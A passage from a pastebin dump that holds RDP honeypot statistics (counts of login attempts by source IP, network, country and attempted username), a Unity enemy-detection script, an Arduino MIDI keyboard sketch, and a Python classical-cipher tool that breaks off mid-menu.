    ""198.235.24.203"": 9,
    ""87.251.75.64"": 3,
    ""157.119.251.94"": 3,
    ""185.170.144.3"": 6,
    ""159.223.34.114"": 3,
    ""205.210.31.212"": 9,
    ""123.56.20.194"": 6,
    ""152.32.197.12"": 3,
    ""94.232.46.148"": 3,
    ""194.169.175.21"": 6,
    ""185.161.248.148"": 3,
    ""45.33.91.123"": 3,
    ""104.152.52.124"": 3,
    ""185.161.248.121"": 18,
    ""64.124.50.139"": 6,
    ""36.91.222.100"": 6,
    ""85.209.11.23"": 3,
    ""14.167.137.207"": 3,
    ""194.165.16.73"": 12,
    ""94.232.45.92"": 9,
    ""103.47.194.128"": 9,
    ""194.165.16.10"": 9,
    ""198.235.24.20"": 9,
    ""187.190.60.112"": 3,
    ""198.235.24.247"": 9
  },
  ""asn"": {
    ""AS55933"": 123,
    ""AS48721"": 33,
    ""AS63737"": 24,
    ""AS267784"": 6,
    ""AS21859"": 18,
    ""AS4134"": 21,
    ""AS208091"": 15,
    ""AS45899"": 57,
    ""AS396982"": 36,
    ""AS135944"": 3,
    ""AS197414"": 6,
    ""AS14061"": 3,
    ""AS37963"": 6,
    ""AS135377"": 3,
    ""AS212482"": 12,
    ""AS209605"": 6,
    ""AS49202"": 21,
    ""AS63949"": 3,
    ""AS14987"": 3,
    ""AS6461"": 6,
    ""AS7713"": 6,
    ""AS57523"": 3,
    ""AS140832"": 9,
    ""AS22884"": 3
  },
  ""isp"": {
    ""Cloudie Limited"": 123,
    ""Flyservers S.A."": 39,
    ""VIETSERVER"": 24,
    ""Zenlayer Inc"": 18,
    ""Chinanet"": 21,
    ""Xhost Internet Solutions LP"": 33,
    ""VietNam Post and Telecom Corporation"": 54,
    ""Google LLC"": 36,
    ""VinhNam Commercial informatics service corporation"": 3,
    ""DigitalOcean, LLC"": 3,
    ""Hangzhou Alibaba Advertising Co"": 6,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 3,
    ""UAB Host Baltic"": 6,
    ""Kisara LLC"": 21,
    ""Akamai Technologies, Inc."": 3,
    ""Rethem Hosting LLC"": 3,
    ""Zayo Bandwidth"": 6,
    ""PT Telekomunikasi Indonesia"": 6,
    ""Chang Way Technologies Co. Limited"": 3,
    ""VNPT-VNNIC"": 3,
    ""FTECH"": 9,
    ""Total Play Telecomunicaciones SA De CV"": 3
  },
  ""org"": {
    ""Cloudie Limited"": 123,
    ""Flyservers S.A"": 33,
    ""VietServer Services technology company limited"": 24,
    ""UAB Host Baltic"": 6,
    ""Zenlayer Inc"": 18,
    ""Chinanet JS"": 21,
    ""Xhost Internet Solutions"": 15,
    ""Vietnam Posts and Telecommunications Group"": 54,
    ""Palo Alto Networks, Inc"": 36,
    ""VINACIS"": 3,
    ""Xhostis"": 6,
    ""DigitalOcean, LLC"": 3,
    ""Aliyun Computing Co., LTD"": 6,
    ""Ucloud Information Technology (hk) Limited"": 3,
    ""Dmitriy Panchenko"": 12,
    ""EmanuelHosting LTD"": 6,
    ""Kisara LLC"": 21,
    ""Linode"": 3,
    ""Rethem Hosting LLC"": 3,
    ""Microsoft Corporation"": 6,
    ""Telekomunikasi Indonesia"": 6,
    ""Chang Way Technologies Co. Limited"": 3,
    ""VietNam Post and Telecom Corporation"": 3,
    ""Unknown"": 9,
    ""Total Play Telecomunicaciones SA De CV"": 3
  },
  ""regionName"": {
    ""Central and Western District"": 123,
    ""Kaunas"": 39,
    ""Hanoi"": 87,
    ""Vilnius"": 6,
    ""North Holland"": 39,
    ""Jiangsu"": 21,
    ""California"": 36,
    ""Ho Chi Minh"": 6,
    ""Central Singapore"": 3,
    ""Beijing"": 6,
    ""S\u00e3o Paulo"": 3,
    ""Perm Krai"": 12,
    ""Moscow"": 24,
    ""New Jersey"": 3,
    ""Illinois"": 3,
    ""Virginia"": 6,
    ""Jakarta"": 6,
    ""Hidalgo"": 3
  },
  ""country"": {
    ""Hong Kong"": 123,
    ""Lithuania"": 45,
    ""Vietnam"": 93,
    ""The Netherlands"": 39,
    ""China"": 27,
    ""United States"": 48,
    ""Singapore"": 3,
    ""Brazil"": 3,
    ""Russia"": 36,
    ""Indonesia"": 6,
    ""Mexico"": 3
  },
  ""account"": {
    ""2963199753"": 123,
    ""Test"": 54,
    ""hello"": 126,
    ""root"": 18,
    ""Administr"": 36,
    ""nbjXYuxTr"": 3,
    ""sVjufJ"": 3,
    ""kXBOmp"": 3,
    ""AeERpIlaM"": 3,
    ""OeEeWv"": 3,
    ""Fnwfsk"": 3,
    ""Administrator"": 3,
    ""(empty)"": 3,
    ""nmap"": 3,
    ""Domain"": 21,
    ""EBOJTTuio"": 3,
    ""jKqyhn"": 3,
    ""BtTNLn"": 3,
    ""kpACDFg"": 3,
    ""kusqPBeTq"": 3,
    ""shAYhL"": 3,
    ""MexaMV"": 3
  },
  ""keyboard"": {
    ""Unknown"": 426
  },
  ""client_build"": {
    ""Unknown"": 426
  },
  ""client_name"": {
    ""Unknown"": 426
  },
  ""ip_type"": {
    ""hosting"": 195,
    ""Unknown"": 192,
    ""proxy"": 39
  }
}"
3QNVXtxq,2024-05-06_stats.json,rdp_snitch,JSON,Monday 6th of May 2024 07:16:08 PM CDT,"{
  ""ip"": {
    ""203.160.55.91"": 82,
    ""194.165.16.11"": 8,
    ""103.232.53.123"": 16,
    ""45.227.254.49"": 4,
    ""193.118.52.78"": 12,
    ""58.218.204.183"": 14,
    ""87.251.75.145"": 8,
    ""123.31.20.85"": 36,
    ""198.235.24.203"": 6,
    ""87.251.75.64"": 2,
    ""157.119.251.94"": 2,
    ""185.170.144.3"": 4,
    ""159.223.34.114"": 2,
    ""205.210.31.212"": 6,
    ""123.56.20.194"": 4,
    ""152.32.197.12"": 2,
    ""94.232.46.148"": 2,
    ""194.169.175.21"": 4,
    ""185.161.248.148"": 2,
    ""45.33.91.123"": 2,
    ""104.152.52.124"": 2,
    ""185.161.248.121"": 12,
    ""64.124.50.139"": 4,
    ""36.91.222.100"": 4,
    ""85.209.11.23"": 2,
    ""14.167.137.207"": 2,
    ""194.165.16.73"": 8,
    ""94.232.45.92"": 6,
    ""103.47.194.128"": 6,
    ""194.165.16.10"": 6,
    ""198.235.24.20"": 6,
    ""187.190.60.112"": 2,
    ""198.235.24.247"": 6
  },
  ""asn"": {
    ""AS55933"": 82,
    ""AS48721"": 22,
    ""AS63737"": 16,
    ""AS267784"": 4,
    ""AS21859"": 12,
    ""AS4134"": 14,
    ""AS208091"": 10,
    ""AS45899"": 38,
    ""AS396982"": 24,
    ""AS135944"": 2,
    ""AS197414"": 4,
    ""AS14061"": 2,
    ""AS37963"": 4,
    ""AS135377"": 2,
    ""AS212482"": 8,
    ""AS209605"": 4,
    ""AS49202"": 14,
    ""AS63949"": 2,
    ""AS14987"": 2,
    ""AS6461"": 4,
    ""AS7713"": 4,
    ""AS57523"": 2,
    ""AS140832"": 6,
    ""AS22884"": 2
  },
  ""isp"": {
    ""Cloudie Limited"": 82,
    ""Flyservers S.A."": 26,
    ""VIETSERVER"": 16,
    ""Zenlayer Inc"": 12,
    ""Chinanet"": 14,
    ""Xhost Internet Solutions LP"": 22,
    ""VietNam Post and Telecom Corporation"": 36,
    ""Google LLC"": 24,
    ""VinhNam Commercial informatics service corporation"": 2,
    ""DigitalOcean, LLC"": 2,
    ""Hangzhou Alibaba Advertising Co"": 4,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 2,
    ""UAB Host Baltic"": 4,
    ""Kisara LLC"": 14,
    ""Akamai Technologies, Inc."": 2,
    ""Rethem Hosting LLC"": 2,
    ""Zayo Bandwidth"": 4,
    ""PT Telekomunikasi Indonesia"": 4,
    ""Chang Way Technologies Co. Limited"": 2,
    ""VNPT-VNNIC"": 2,
    ""FTECH"": 6,
    ""Total Play Telecomunicaciones SA De CV"": 2
  },
  ""org"": {
    ""Cloudie Limited"": 82,
    ""Flyservers S.A"": 22,
    ""VietServer Services technology company limited"": 16,
    ""UAB Host Baltic"": 4,
    ""Zenlayer Inc"": 12,
    ""Chinanet JS"": 14,
    ""Xhost Internet Solutions"": 10,
    ""Vietnam Posts and Telecommunications Group"": 36,
    ""Palo Alto Networks, Inc"": 24,
    ""VINACIS"": 2,
    ""Xhostis"": 4,
    ""DigitalOcean, LLC"": 2,
    ""Aliyun Computing Co., LTD"": 4,
    ""Ucloud Information Technology (hk) Limited"": 2,
    ""Dmitriy Panchenko"": 8,
    ""EmanuelHosting LTD"": 4,
    ""Kisara LLC"": 14,
    ""Linode"": 2,
    ""Rethem Hosting LLC"": 2,
    ""Microsoft Corporation"": 4,
    ""Telekomunikasi Indonesia"": 4,
    ""Chang Way Technologies Co. Limited"": 2,
    ""VietNam Post and Telecom Corporation"": 2,
    ""Unknown"": 6,
    ""Total Play Telecomunicaciones SA De CV"": 2
  },
  ""regionName"": {
    ""Central and Western District"": 82,
    ""Kaunas"": 26,
    ""Hanoi"": 58,
    ""Vilnius"": 4,
    ""North Holland"": 26,
    ""Jiangsu"": 14,
    ""California"": 24,
    ""Ho Chi Minh"": 4,
    ""Central Singapore"": 2,
    ""Beijing"": 4,
    ""S\u00e3o Paulo"": 2,
    ""Perm Krai"": 8,
    ""Moscow"": 16,
    ""New Jersey"": 2,
    ""Illinois"": 2,
    ""Virginia"": 4,
    ""Jakarta"": 4,
    ""Hidalgo"": 2
  },
  ""country"": {
    ""Hong Kong"": 82,
    ""Lithuania"": 30,
    ""Vietnam"": 62,
    ""The Netherlands"": 26,
    ""China"": 18,
    ""United States"": 32,
    ""Singapore"": 2,
    ""Brazil"": 2,
    ""Russia"": 24,
    ""Indonesia"": 4,
    ""Mexico"": 2
  },
  ""account"": {
    ""2963199753"": 82,
    ""Test"": 36,
    ""hello"": 84,
    ""root"": 12,
    ""Administr"": 24,
    ""nbjXYuxTr"": 2,
    ""sVjufJ"": 2,
    ""kXBOmp"": 2,
    ""AeERpIlaM"": 2,
    ""OeEeWv"": 2,
    ""Fnwfsk"": 2,
    ""Administrator"": 2,
    ""(empty)"": 2,
    ""nmap"": 2,
    ""Domain"": 14,
    ""EBOJTTuio"": 2,
    ""jKqyhn"": 2,
    ""BtTNLn"": 2,
    ""kpACDFg"": 2,
    ""kusqPBeTq"": 2,
    ""shAYhL"": 2,
    ""MexaMV"": 2
  },
  ""keyboard"": {
    ""Unknown"": 284
  },
  ""client_build"": {
    ""Unknown"": 284
  },
  ""client_name"": {
    ""Unknown"": 284
  },
  ""ip_type"": {
    ""hosting"": 130,
    ""Unknown"": 128,
    ""proxy"": 26
  }
}"
08MabVac,2024-05-06_stats.json,rdp_snitch,JSON,Monday 6th of May 2024 07:15:08 PM CDT,"{
  ""ip"": {
    ""203.160.55.91"": 41,
    ""194.165.16.11"": 4,
    ""103.232.53.123"": 8,
    ""45.227.254.49"": 2,
    ""193.118.52.78"": 6,
    ""58.218.204.183"": 7,
    ""87.251.75.145"": 4,
    ""123.31.20.85"": 18,
    ""198.235.24.203"": 3,
    ""87.251.75.64"": 1,
    ""157.119.251.94"": 1,
    ""185.170.144.3"": 2,
    ""159.223.34.114"": 1,
    ""205.210.31.212"": 3,
    ""123.56.20.194"": 2,
    ""152.32.197.12"": 1,
    ""94.232.46.148"": 1,
    ""194.169.175.21"": 2,
    ""185.161.248.148"": 1,
    ""45.33.91.123"": 1,
    ""104.152.52.124"": 1,
    ""185.161.248.121"": 6,
    ""64.124.50.139"": 2,
    ""36.91.222.100"": 2,
    ""85.209.11.23"": 1,
    ""14.167.137.207"": 1,
    ""194.165.16.73"": 4,
    ""94.232.45.92"": 3,
    ""103.47.194.128"": 3,
    ""194.165.16.10"": 3,
    ""198.235.24.20"": 3,
    ""187.190.60.112"": 1,
    ""198.235.24.247"": 3
  },
  ""asn"": {
    ""AS55933"": 41,
    ""AS48721"": 11,
    ""AS63737"": 8,
    ""AS267784"": 2,
    ""AS21859"": 6,
    ""AS4134"": 7,
    ""AS208091"": 5,
    ""AS45899"": 19,
    ""AS396982"": 12,
    ""AS135944"": 1,
    ""AS197414"": 2,
    ""AS14061"": 1,
    ""AS37963"": 2,
    ""AS135377"": 1,
    ""AS212482"": 4,
    ""AS209605"": 2,
    ""AS49202"": 7,
    ""AS63949"": 1,
    ""AS14987"": 1,
    ""AS6461"": 2,
    ""AS7713"": 2,
    ""AS57523"": 1,
    ""AS140832"": 3,
    ""AS22884"": 1
  },
  ""isp"": {
    ""Cloudie Limited"": 41,
    ""Flyservers S.A."": 13,
    ""VIETSERVER"": 8,
    ""Zenlayer Inc"": 6,
    ""Chinanet"": 7,
    ""Xhost Internet Solutions LP"": 11,
    ""VietNam Post and Telecom Corporation"": 18,
    ""Google LLC"": 12,
    ""VinhNam Commercial informatics service corporation"": 1,
    ""DigitalOcean, LLC"": 1,
    ""Hangzhou Alibaba Advertising Co"": 2,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 1,
    ""UAB Host Baltic"": 2,
    ""Kisara LLC"": 7,
    ""Akamai Technologies, Inc."": 1,
    ""Rethem Hosting LLC"": 1,
    ""Zayo Bandwidth"": 2,
    ""PT Telekomunikasi Indonesia"": 2,
    ""Chang Way Technologies Co. Limited"": 1,
    ""VNPT-VNNIC"": 1,
    ""FTECH"": 3,
    ""Total Play Telecomunicaciones SA De CV"": 1
  },
  ""org"": {
    ""Cloudie Limited"": 41,
    ""Flyservers S.A"": 11,
    ""VietServer Services technology company limited"": 8,
    ""UAB Host Baltic"": 2,
    ""Zenlayer Inc"": 6,
    ""Chinanet JS"": 7,
    ""Xhost Internet Solutions"": 5,
    ""Vietnam Posts and Telecommunications Group"": 18,
    ""Palo Alto Networks, Inc"": 12,
    ""VINACIS"": 1,
    ""Xhostis"": 2,
    ""DigitalOcean, LLC"": 1,
    ""Aliyun Computing Co., LTD"": 2,
    ""Ucloud Information Technology (hk) Limited"": 1,
    ""Dmitriy Panchenko"": 4,
    ""EmanuelHosting LTD"": 2,
    ""Kisara LLC"": 7,
    ""Linode"": 1,
    ""Rethem Hosting LLC"": 1,
    ""Microsoft Corporation"": 2,
    ""Telekomunikasi Indonesia"": 2,
    ""Chang Way Technologies Co. Limited"": 1,
    ""VietNam Post and Telecom Corporation"": 1,
    ""Unknown"": 3,
    ""Total Play Telecomunicaciones SA De CV"": 1
  },
  ""regionName"": {
    ""Central and Western District"": 41,
    ""Kaunas"": 13,
    ""Hanoi"": 29,
    ""Vilnius"": 2,
    ""North Holland"": 13,
    ""Jiangsu"": 7,
    ""California"": 12,
    ""Ho Chi Minh"": 2,
    ""Central Singapore"": 1,
    ""Beijing"": 2,
    ""S\u00e3o Paulo"": 1,
    ""Perm Krai"": 4,
    ""Moscow"": 8,
    ""New Jersey"": 1,
    ""Illinois"": 1,
    ""Virginia"": 2,
    ""Jakarta"": 2,
    ""Hidalgo"": 1
  },
  ""country"": {
    ""Hong Kong"": 41,
    ""Lithuania"": 15,
    ""Vietnam"": 31,
    ""The Netherlands"": 13,
    ""China"": 9,
    ""United States"": 16,
    ""Singapore"": 1,
    ""Brazil"": 1,
    ""Russia"": 12,
    ""Indonesia"": 2,
    ""Mexico"": 1
  },
  ""account"": {
    ""2963199753"": 41,
    ""Test"": 18,
    ""hello"": 42,
    ""root"": 6,
    ""Administr"": 12,
    ""nbjXYuxTr"": 1,
    ""sVjufJ"": 1,
    ""kXBOmp"": 1,
    ""AeERpIlaM"": 1,
    ""OeEeWv"": 1,
    ""Fnwfsk"": 1,
    ""Administrator"": 1,
    ""(empty)"": 1,
    ""nmap"": 1,
    ""Domain"": 7,
    ""EBOJTTuio"": 1,
    ""jKqyhn"": 1,
    ""BtTNLn"": 1,
    ""kpACDFg"": 1,
    ""kusqPBeTq"": 1,
    ""shAYhL"": 1,
    ""MexaMV"": 1
  },
  ""keyboard"": {
    ""Unknown"": 142
  },
  ""client_build"": {
    ""Unknown"": 142
  },
  ""client_name"": {
    ""Unknown"": 142
  },
  ""ip_type"": {
    ""hosting"": 65,
    ""Unknown"": 64,
    ""proxy"": 13
  }
}"
1JZ3SB4a,ChatGPT Enemy Detection Script (Untested),Krythic,C#,Monday 6th of May 2024 07:14:37 PM CDT,"using UnityEngine;

public class EnemyDetection : MonoBehaviour
{
    public float detectionRadius = 10f;
    public float moveSpeed = 5f;
    public float rotationSpeed = 180f; // Degrees per second
    public LayerMask targetLayer;

    private Transform player;
    private bool playerDetected = false;

    void Start()
    {
        player = GameObject.FindGameObjectWithTag(""Player"").transform;
    }

    void Update()
    {
        if (!playerDetected)
        {
            // Check if player is within detection radius
            Collider2D[] colliders = Physics2D.OverlapCircleAll(transform.position, detectionRadius, targetLayer);
            foreach (Collider2D collider in colliders)
            {
                if (collider.CompareTag(""Player""))
                {
                    // Player detected, start moving towards and rotating to face the player
                    Debug.Log(""Enemy detected player!"");
                    playerDetected = true;
                    break;
                }
            }
        }
        else
        {
            // Move towards the player
            Vector2 direction = (player.position - transform.position).normalized;
            transform.Translate(direction * moveSpeed * Time.deltaTime);

            // Rotate towards the player
            float angle = Mathf.Atan2(direction.y, direction.x) * Mathf.Rad2Deg;
            Quaternion targetRotation = Quaternion.Euler(new Vector3(0f, 0f, angle - 90f));
            transform.rotation = Quaternion.RotateTowards(transform.rotation, targetRotation, rotationSpeed * Time.deltaTime);
        }
    }

    void OnDrawGizmosSelected()
    {
        // Draw detection radius in Unity editor
        Gizmos.color = Color.red;
        Gizmos.DrawWireSphere(transform.position, detectionRadius);
    }
}
"
6zefB1F9,GPT - MIDI + Chave + Debounce,NicoChan,C++,Monday 6th of May 2024 06:43:47 PM CDT,"#include <MIDI.h>

const int ROWS = 9;  // Número de linhas na matriz
const int COLS = 6;  // Número de colunas na matriz
const int MIDI_CHANNEL = 1;  // Canal MIDI para envio de dados

// Mapeamento das teclas para notas MIDI
const byte NOTE_MAP[ROWS][COLS] = {
  {36, 37, 38, 39, 40, 41},  // Notas da primeira linha
  {42, 43, 44, 45, 46, 47},  // Notas da segunda linha
  {48, 49, 50, 51, 52, 53},  // Notas da terceira linha
  {54, 55, 56, 57, 58, 59},  // Notas da quarta linha
  {60, 61, 62, 63, 64, 65},  // Notas da quinta linha
  {66, 67, 68, 69, 70, 71},  // Notas da sexta linha
  {72, 73, 74, 75, 76, 77},  // Notas da sétima linha
  {78, 79, 80, 81, 82, 83},  // Notas da oitava linha
  {84, 0, 0, 0, 0, 0}         // Última linha, apenas a primeira coluna é usada
};

// Pinos da matriz
const int rowPins[ROWS] = {2, 3, 4, 5, 6, 7, 8, 9, 10};
const int colPins[COLS] = {11, 12, 13, A0, A1, A2};

// Pinos da chave de 3 posições para controlar a oitava
const int octaveSwitchPin1 = A3;
const int octaveSwitchPin2 = A4;

// Variável para armazenar o estado da oitava (0, 1 ou 2)
int octaveState = 1; // Por padrão, configuração normal (oitava 1)

// Array para armazenar o estado atual das teclas
bool keyState[ROWS][COLS];
unsigned long lastDebounceTime[ROWS][COLS] = {0};
unsigned long debounceDelay = 50;

void setup() {
  MIDI.begin(MIDI_CHANNEL);
  
  // Configuração dos pinos
  for (int i = 0; i < ROWS; i++) {
    pinMode(rowPins[i], INPUT_PULLUP);
  }
  for (int i = 0; i < COLS; i++) {
    pinMode(colPins[i], OUTPUT);
    digitalWrite(colPins[i], HIGH);
  }
  pinMode(octaveSwitchPin1, INPUT_PULLUP);
  pinMode(octaveSwitchPin2, INPUT_PULLUP);
}

void loop() {
  // Lê o estado atual das teclas
  readKeys();
  
  // Lê o estado atual da chave de 3 posições
  readOctaveSwitch();

  // Envia eventos MIDI para teclas pressionadas
  sendMIDI();
}

void readKeys() {
  for (int col = 0; col < COLS; col++) {
    // Ativa a coluna
    digitalWrite(colPins[col], LOW);

    // Verifica as linhas para ver se alguma tecla está pressionada
    for (int row = 0; row < ROWS; row++) {
      if (digitalRead(rowPins[row]) == LOW) {
        if ((millis() - lastDebounceTime[row][col]) > debounceDelay) {
          keyState[row][col] = true;
          lastDebounceTime[row][col] = millis();
        }
      } else {
        keyState[row][col] = false;
      }
    }

    // Desativa a coluna
    digitalWrite(colPins[col], HIGH);
  }
}

void readOctaveSwitch() {
  // Lê o estado da chave de 3 posições
  int switch1State = digitalRead(octaveSwitchPin1);
  int switch2State = digitalRead(octaveSwitchPin2);

  // Calcula o estado da oitava
  octaveState = switch1State * 2 + switch2State;
}

void sendMIDI() {
  for (int row = 0; row < ROWS; row++) {
    for (int col = 0; col < COLS; col++) {
      // Verifica se a tecla está pressionada e se é válida
      if (keyState[row][col] && NOTE_MAP[row][col] != 0) {
        // Ajusta a nota MIDI baseada no estado da oitava
        byte adjustedNote = NOTE_MAP[row][col] + (octaveState - 1) * 12;
        
        // Envia uma nota MIDI pressionada
        MIDI.sendNoteOn(adjustedNote, 127, MIDI_CHANNEL);
      } else {
        // Ajusta a nota MIDI baseada no estado da oitava
        byte adjustedNote = NOTE_MAP[row][col] + (octaveState - 1) * 12;
        
        // Envia uma mensagem de desligamento para a nota MIDI liberada
        MIDI.sendNoteOff(adjustedNote, 0, MIDI_CHANNEL);
      }
    }
  }
}
"
mMXwhkBp,cipher_tool,Python253,Python,Monday 6th of May 2024 06:11:29 PM CDT,"#!/usr/bin/env python
# -*- coding: utf-8 -*-
# Filename: cipher_tool.py
# Version: 1.0.0
# Author: Jeoi Reqi

""""""
This script serves as a comprehensive tool for encoding and decoding various classical ciphers.

It offers functionalities for a range of encoding and decoding techniques for the following:

    1: Caesar Cipher:
        - Allows encoding and decoding text by shifting characters a fixed number of positions in the alphabet.

    2: A1Z26 Cipher:
        - For encoding, it converts alphabetic characters into their corresponding numeric positions in the alphabet.
        - During decoding, it reverses this process, converting numeric sequences back into alphabetic characters.
            - Note: Spaces in the encoded text are represented by '0'.

    3: Atbash Cipher:
        - Inverts the alphabet, substituting each letter with its reverse counterpart.

    4: Rail Fence Cipher:
        - Utilizes a transposition technique, encoding text by writing it in a zigzag pattern across a specified number of ""rails"".
          Then it reads off the encoded text row by row to decode to plaintext.

    5: Vigenère Cipher:
        - Employs a keyword to encode text, shifting characters in a repeating pattern based on the keyword's letters.
          Decoding with Vigenère reverses this process, decrypting text based on the keyword.

Requirements:
    - Python 3.x
    - Colorama (install with 'pip install colorama')
    
Usage:
    - Run the script and choose a cipher type by entering the corresponding number.
    - Follow the prompts to enter the text and any required parameters.
    - The script will output the encoded or decoded text.

Additional Notes:
    - For Rail Fence cipher, the number of rails must be a positive integer.
    - For Vigenère cipher, the key should be a string of alphabetic characters.
    - For A1Z26 cipher:
        - When encoding, the input text should consist of alphabetic characters.
        - When decoding, the input text should consist of numeric characters separated by spaces.
""""""

#IMPORTS
from colorama import Fore, Style

# CAESAR CIPHER
def caesar_cipher(text, shift, mode):
    """"""
    Caesar cipher encoding or decoding.

    Args:
        text (str): The text to be encoded or decoded.
        shift (int): The shift value for encoding or decoding.
        mode (str): '1' for encoding, '2' for decoding.

    Returns:
        str: The encoded or decoded text.
    """"""
    result = """"
    for char in text:
        if char.isalpha():
            if mode == '1':  # Encode
                if char.islower():
                    result += chr((ord(char) - 97 + shift) % 26 + 97)
                else:
                    result += chr((ord(char) - 65 + shift) % 26 + 65)
            elif mode == '2':  # Decode
                if char.islower():
                    result += chr((ord(char) - 97 - shift) % 26 + 97)
                else:
                    result += chr((ord(char) - 65 - shift) % 26 + 65)
        else:
            result += char
    return result

# A1Z26 CIPHER
def a1z26_cipher(text, mode):
    """"""
    A1Z26 cipher encoding or decoding.

    Args:
        text (str): The text to be encoded or decoded.
        mode (str): '3' for encoding, '4' for decoding.

    Returns:
        str: The encoded or decoded text.
    """"""
    if mode == '3':    # ENCODE
        result = ' '.join(str(ord(char) - 96) if char.isalpha() else '0' for char in text)
    elif mode == '4':  # DECODE
        result = ''
        nums = text.split()
        for num in nums:
            if num == '0':
                result += ' '
            else:
                result += chr(int(num) + 96)
    else:
        result = ""\nInvalid mode! Please choose '3' for encoding or '4' for decoding.\n""
    return result

# ATBASH CIPHER
def atbash_cipher(text, mode):
    """"""
    Atbash cipher encoding or decoding.

    Args:
        text (str): The text to be encoded or decoded.
        mode (str): '5' for encoding, '6' for decoding.

    Returns:
        str: The encoded or decoded text.
    """"""
    result = """"
    for char in text:
        if char.isalpha():
            if char.islower():
                result += chr(122 - ord(char) + 97)
            else:
                result += chr(90 - ord(char) + 65)
        else:
            result += char
    return result

# RAILFENCE CIPHER (ENCODE)
def encode_RailFence(text, key):
    """"""
    Rail Fence cipher encoding.

    Args:
        text (str): The text to be encoded.
        key (int): The number of rails.

    Returns:
        str: The encoded text.
    """"""
    rail = [['\n' for i in range(len(text))] for j in range(key)]
    dir_down = False
    row, col = 0, 0
     
    for i in range(len(text)):
        if (row == 0) or (row == key - 1):
            dir_down = not dir_down
         
        rail[row][col] = text[i]
        col += 1
         
        if dir_down:
            row += 1
        else:
            row -= 1
    
    result = []
    for i in range(key):
        for j in range(len(text)):
            if rail[i][j] != '\n':
                result.append(rail[i][j])
    return ''.join(result)

# RAILFENCE CIPHER (DECODE)
def decode_RailFence(cipher, key):
    """"""
    Rail Fence cipher decoding.

    Args:
        cipher (str): The text to be decoded.
        key (int): The number of rails.

    Returns:
        str: The decoded text.
    """"""
    rail = [['\n' for i in range(len(cipher))] for j in range(key)]
    dir_down = None
    row, col = 0, 0
     
    for i in range(len(cipher)):
        if row == 0:
            dir_down = True
        if row == key - 1:
            dir_down = False
         
        rail[row][col] = '*'
        col += 1
         
        if dir_down:
            row += 1
        else:
            row -= 1
             
    index = 0
    for i in range(key):
        for j in range(len(cipher)):
            if (rail[i][j] == '*') and (index < len(cipher)):
                rail[i][j] = cipher[index]
                index += 1
         
    result = []
    row, col = 0, 0
    for i in range(len(cipher)):
        if row == 0:
            dir_down = True
        if row == key - 1:
            dir_down = False
             
        if rail[row][col] != '*':
            result.append(rail[row][col])
            col += 1
             
        if dir_down:
            row += 1
        else:
            row -= 1
    return ''.join(result)

# VIGENERE CIPHER
def vigenere_cipher(text, key, mode):
    """"""
    Vigenère cipher encoding or decoding.

    Args:
        text (str): The text to be encoded or decoded.
        key (str): The key for encoding or decoding.
        mode (str): '9' for encoding, '10' for decoding.

    Returns:
        str: The encoded or decoded text.
    """"""
    result = """"
    key_length = len(key)
    key_index = 0
    for char in text:
        if char.isalpha():
            if mode == '9':  # Encode
                if char.islower():
                    shift = ord(key[key_index].lower()) - 97
                    result += chr((ord(char) - 97 + shift) % 26 + 97)
                else:
                    shift = ord(key[key_index].lower()) - 97
                    result += chr((ord(char) - 65 + shift) % 26 + 65)
            elif mode == '10':  # Decode
                if char.islower():
                    shift = ord(key[key_index].lower()) - 97
                    result += chr((ord(char) - 97 - shift) % 26 + 97)
                else:
                    shift = ord(key[key_index].lower()) - 97
                    result += chr((ord(char) - 65 - shift) % 26 + 65)
            key_index = (key_index + 1) % key_length
        else:
            result += char
    return result

# PREPARE TEXT
def prepare_text(text):
    """"""
    Prepare text for encoding.

    Args:
        text (str): The text to be prepared.

    Returns:
        str: The prepared text.
    """"""
    # Remove non-alphabetic characters and convert to uppercase
    cleaned_text = ''.join(char.upper() for char in text if char.isalpha())
    # Replace 'J' with 'I'
    cleaned_text = cleaned_text.replace('J', 'I')
    return cleaned_text

# MAIN MENU & FUNCTION CALLS
def main():
    """"""
    Main function to run the cipher tool.
    """"""
    while True:
        print(""-"" * 28)
        print(Style.BRIGHT + Fore.GREEN + ""     :: CIPHER TOOL ::"" + Style.RESET_ALL)
        print(""-"" * 28)
        print(Style.BRIGHT +""\nCHOOSE A CIPHER TYPE:\n"" + Style.RESET_ALL)
        print(Style.BRIGHT + ""01. "" + Fore.GREEN + ""Caesar Encode        [+]"" + Style.RESET_ALL)
        print(Style.BRIGHT + ""02. "" + Fore.YELLOW + ""Caesar Decode        [-]"" + Style.RESET_ALL)
        print(Style.BRIGHT + ""03. "" + Fore.GREEN + ""A1Z26 Encode         [+]"" + Style.RESET_ALL)
        print(Style.BRIGHT + ""04. "" + Fore.YELLOW + ""A1Z26 Decode         [-]"" + Style.RESET_ALL)
        print(Style.BRIGHT + ""05. "" + Fore.GREEN + ""Atbash Encode        [+]"" + Style.RESET_ALL)
        print(Style.BRIGHT + ""06. "" + Fore.YELLOW + ""Atbash Decode        [-]"" + Style.RESET_ALL)
        print(Style.BRIGHT + ""07. "" + Fore.GREEN + ""Rail Fence Encode    [+]"" + Style.RESET_ALL)
        print(Style.BRIGHT + ""08. "" + Fore.YELLOW + ""Rail Fence Decode    [-]"" + Style.RESET_ALL)
        print(Style.BRIGHT + ""09. "" + Fore.GREEN + ""Vigenère Encode      [+]"" + Style.RESET_ALL)
        print(Style.BRIGHT + ""10. "" + Fore.YELLOW + ""Vigenère Decode      [-]"" + Style.RESET_ALL)
        print(Style.BRIGHT + ""0. "" + Fore.RED + ""Exit                  [!]"" + Style.RESET_ALL)

        choice = input(Style.BRIGHT +""\nEnter your choice (1-10)\nOr... type '0' to EXIT:  "" + Style.RESET_ALL)

        if choice == '1' or choice == '2':
            mode = choice
            text = input(""\nEnter the text: "")
            shift = int(input(""\nEnter the shift value: ""))
            print(""\nEncoded/Decoded text:"", caesar_cipher(text, shift, mode))
        elif choice == '3' or choice == '4':
            mode = choice
            if mode == '3':
                text = input(""\nEnter the plaintext to encode: "")
            else:
                text = input(""\nEnter the ciphertext to decode: "")
            print(""\nEncoded/Decoded text:"", a1z26_cipher(text, mode))
        elif choice == '5' or choice == '6':
            mode = choice
            if mode == '5':
                text = input(""\nEnter the plaintext to encode: "")
            else:
                text = input(""\nEnter the ciphertext to decode: "")
            print(""\nEncoded/Decoded text:"", atbash_cipher(text, mode))
        elif choice == '7':
            text = input(""\nEnter the plaintext to encode: "")
            key = int(input(""\nEnter the number of rails: ""))
            print(""\nEncoded text:"", encode_RailFence(text, key))
        elif choice == '8':
